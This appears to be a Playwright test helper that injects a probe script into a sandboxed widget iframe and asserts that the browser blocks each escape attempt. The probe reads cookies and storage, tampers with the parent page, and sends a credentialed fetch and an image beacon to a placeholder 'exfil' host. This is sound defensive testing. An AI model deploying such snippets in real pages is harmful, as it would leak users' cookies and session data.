import { expect, type Page } from "@playwright/test";

// Synthetic targets are intercepted if a browser restriction ever regresses.
const probeUrl = "https://exfil.example.invalid/rotapress-security-probe";
export const customCodeSecurityProbe = `
const results = [];
for (const [label, probe] of [
  ["parent", () => parent.document.body.dataset.compromised = "yes"],
  ["cookie", () => document.cookie],
  ["storage", () => localStorage.getItem("probe")],
  ["top navigation", () => top.location.href = "${probeUrl}"],
]) {
  try { probe(); results.push(label + " FAILED"); }
  catch { results.push(label + " blocked"); }
}
Promise.all([
  fetch("${probeUrl}", {credentials: "include"})
    .then(() => results.push("fetch FAILED"), () => results.push("fetch blocked")),
  new Promise(resolve => {
    const image = new Image();
    image.onload = () => { results.push("image FAILED"); resolve(); };
    image.onerror = () => { results.push("image blocked"); resolve(); };
    image.src = "${probeUrl}?image=synthetic";
  }),
]).then(() => {
  const receipt = document.createElement("p");
  receipt.id = "security-receipt";
  receipt.textContent = results.sort().join("; ");
  document.body.append(receipt);
});`;

export async function interceptCustomCodeProbe(page: Page) {
  let reachedNetwork = false;
  const pattern = "https://exfil.example.invalid/**";
  const handler: Parameters<Page["route"]>[1] = async (route) => {
    reachedNetwork = true;
    await route.abort();
  };
  await page.route(pattern, handler);
  return {
    async check() {
      const frame = page.frameLocator('iframe[title="Counter widget"]');
      await expect(frame.locator("#security-receipt")).toHaveText(
        "cookie blocked; fetch blocked; image blocked; parent blocked; storage blocked; top navigation blocked",
      );
      expect(
        reachedNetwork,
        "The sandbox must block requests before the network",
      ).toBe(false);
      expect(
        await page.locator("body").getAttribute("data-compromised"),
      ).toBeNull();
    },
    async dispose() {
      await page.unroute(pattern, handler);
    },
  };
}
